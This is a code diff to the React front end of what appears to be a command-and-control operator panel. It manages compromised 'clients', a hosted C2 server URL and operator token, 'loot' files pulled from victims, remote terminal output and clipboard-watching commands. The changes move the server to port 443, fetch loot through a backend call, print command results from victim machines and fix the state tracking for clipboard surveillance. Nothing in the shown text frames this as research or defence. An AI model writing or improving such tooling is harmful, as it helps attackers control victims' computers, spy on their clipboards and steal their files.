@@ -22,7 +22,7 @@ export default function App() {
 
   // ---- UI State ----
   const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
-  const [serverPort] = useState('9540');
+  const [serverPort] = useState('443');
   const [c2ServerUrl, setC2ServerUrl] = useState<string>(() => localStorage.getItem('c2_server_url') || 'https://your-c2-service.onrender.com');
   const [c2OperatorToken, setC2OperatorToken] = useState<string>(() => localStorage.getItem('c2_operator_token') || '');
   const [c2Mode, setC2Mode] = useState<'cloud' | 'local'>(() => (localStorage.getItem('c2_mode') as any) || 'cloud');
@@ -54,7 +54,7 @@ export default function App() {
   const [copiedPath, setCopiedPath] = useState(false);
 
   // ---- Loot State ----
-  const [lootFiles] = useState<LootFile[]>([]);
+  const [lootFiles, setLootFiles] = useState<LootFile[]>([]);
   const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
   const [lootContent, setLootContent] = useState<string | null>(null);
 
@@ -126,6 +126,11 @@ export default function App() {
           } catch (_) {}
         }
 
+        try {
+          const loot = await invoke<LootFile[]>('get_loot');
+          setLootFiles(loot);
+        } catch (_) {}
+
         setClients(backendClients);
         setLogs(backendLogs);
         logsRef.current = backendLogs;
@@ -153,6 +158,10 @@ export default function App() {
             } catch (_) {}
           } else if (log.output.includes('[JSON_FILES]')) {
             parseFileList(log.output);
+          } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued') && !printedIdsRef.current.has(log.id)) {
+            printedIdsRef.current.add(log.id);
+            const cmdLabel = log.command || 'Command';
+            setTermLogs(prev => [...prev, `\n[${cmdLabel}] ${log.client_id}`, log.output]);
           }
         });
 
@@ -738,6 +747,7 @@ export default function App() {
           {activeTab === 'terminal' && (
             <TerminalView
               clients={clients}
+              selectedClientId={selectedClientId}
               termLogs={termLogs}
               termInput={termInput}
               setTermInput={setTermInput}
@@ -877,8 +887,14 @@ export default function App() {
               }))
               .reverse();
 
-            const isWatching = logs.some(l => l.command === 'clipwatch' && l.status === 'SUCCESS') &&
-              !logs.some(l => l.command === 'clipstop' && l.status === 'SUCCESS');
+            const isWatching = (() => {
+              let watching = false;
+              for (const l of logs) {
+                if (l.status === 'SUCCESS' && l.command === 'clipwatch') watching = true;
+                if (l.status === 'SUCCESS' && l.command === 'clipstop') watching = false;
+              }
+              return watching;
+            })();
 
             return (
               <div className="h-full flex flex-col space-y-3">
